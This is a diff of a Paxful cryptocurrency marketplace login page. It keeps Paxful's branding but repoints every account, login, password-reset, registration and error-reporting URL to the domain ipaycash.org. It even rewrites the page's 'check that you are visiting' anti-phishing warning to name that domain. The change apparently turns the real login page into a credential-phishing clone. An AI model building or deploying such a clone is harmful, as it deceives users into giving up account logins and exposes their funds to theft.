@@ -741,24 +741,24 @@
                 "zh-cn": "\u7b80\u4f53\u4e2d\u6587(SC)",
                 "zh-tw": "\u7e41\u9ad4\u4e2d\u6587(TC)"
             },
-            baseUrl: "https://accounts.paxful.com/",
-            paxfulLink: "https://paxful.com/?locale=en",
-            createAccountLink: "https://paxful.com/register?locale=en",
+            baseUrl: "https://accounts.ipaycash.org/",
+            paxfulLink: "https://ipaycash.org/?locale=en",
+            createAccountLink: "https://ipaycash.org/register?locale=en",
             csrfMiddlewareToken: "VRH92eGxfM6RxIRfUTgxzSDBdaBIj6L6bHe8wUcMfofFd3bsMrKgiR406SCTBO39",
             currentLanguage: "en",
             currentUser: null,
             environment: "prod",
-            forgotPasswordLink: "https://paxful.com/forgot-password?locale=en",
+            forgotPasswordLink: "https://ipaycash.org/forgot-password?locale=en",
             geetestEnabled: true,
             geetestV4Enabled: true,
             releaseVersion: "accounts-service@0.3.649",
-            sentryDsn: "https://07e3dd517361467c91f4b1c2cc39f2a0@sentry.paxful.com/9",
-            supportRestrictionsLink: "https://paxful.com/support/articles/360025513353?locale=en",
+            sentryDsn: "https://07e3dd517361467c91f4b1c2cc39f2a0@sentry.ipaycash.org/9",
+            supportRestrictionsLink: "https://ipaycash.org/support/articles/360025513353?locale=en",
             adaWidgetEnabled: false,
             rtlFeatureEnabled: false,
             // Templates based variables
             login: {
-                next: "https://paxful.com/login"
+                next: "https://ipaycash.org/login"
             },
             blocked: {
                 locationName: null
@@ -931,7 +931,7 @@
                                             clip-rule="evenodd"></path>
                                     </svg>
                                     <div class="d-flex flex-column flex-xs-row">IMPORTANT! Please check that you are
-                                        visiting https://accounts.paxful.com/<img
+                                        visiting https://accounts.ipaycash.org/<img
                                             src="static/dist/assets/images/https-label-91194ad43fc85d71e34a467282e95f23.png"
                                             class="mt-2 ml-xs-3 align-self-start LoginTemplate__labelIcon" alt="url">
                                     </div>
@@ -958,7 +958,7 @@
                                         <div class="d-flex align-items-start justify-content-between"><label
                                                 for="password" class="label-small font-weight-semibold">Your
                                                 Password</label><a class="regular-20 lh-16" tabindex="-1"
-                                                href="https://paxful.com/forgot-password?locale=en">Forgot password?</a>
+                                                href="https://ipaycash.org/forgot-password?locale=en">Forgot password?</a>
                                         </div>
                                         <div>
                                             <div
@@ -986,7 +986,7 @@
                                         </svg></button>
                                 </form>
                                 <hr class="mt-4"><span class="d-flex regular-24">New on Paxful?<a
-                                        href="https://paxful.com/register?locale=en" class="ml-2">Create an
+                                        href="https://ipaycash.org/register?locale=en" class="ml-2">Create an
                                         Account</a></span>
                             </div>
                         </div>
@@ -1001,8 +1001,8 @@
                 <!--div class="d-none d-lg-block col-12 col-xl-7 col-lg-6 pl-0 overflow-hidden bg-blue-100">
                     <div class="d-flex align-items-center justify-content-center h-100 overflow-hidden">
                         <img
-                            src="https://accounts.paxful.com/static/dist/assets/images/log-in@1.5x-ac6b0b2e5316801c22536af43a60755f.png"
-                            srcset="https://accounts.paxful.com/static/dist/assets/images/log-in@1.5x-ac6b0b2e5316801c22536af43a60755f.png">
+                            src="https://accounts.ipaycash.org/static/dist/assets/images/log-in@1.5x-ac6b0b2e5316801c22536af43a60755f.png"
+                            srcset="https://accounts.ipaycash.org/static/dist/assets/images/log-in@1.5x-ac6b0b2e5316801c22536af43a60755f.png">
                     </div>
                     <img src="/static/dist/assets/images/log-in@1x-66ff6d4608ab29a6710651bfd9e6171c.png" srcset="/static/dist/assets/images/log-in@1.5x-ac6b0b2e5316801c22536af43a60755f.png 900w, /static/dist/assets/images/log-in@1x-66ff6d4608ab29a6710651bfd9e6171c.png 600w" loading="lazy" alt="Create an Account" sizes="(max-width: 1200px) 400px, (max-width: 1400px) 500px, 600px" style="opacity: 1;">
                 </div-->
@@ -1017,7 +1017,7 @@
     <script src="/static/dist/vendors.chunk.js?c=5bdcf6931eafd5c4ff72" defer=""></script>
     <script src="/static/dist/main.2f73762b1965215955f8.bundle.js" defer=""></script>
 
-    <!-- Accessibility - paxful.com -->
+    <!-- Accessibility - ipaycash.org/ -->
 
     <script async="" id="__ada" data-handle="paxful" src="https://static.ada.support/embed2.js"></script>
     <script defer=""
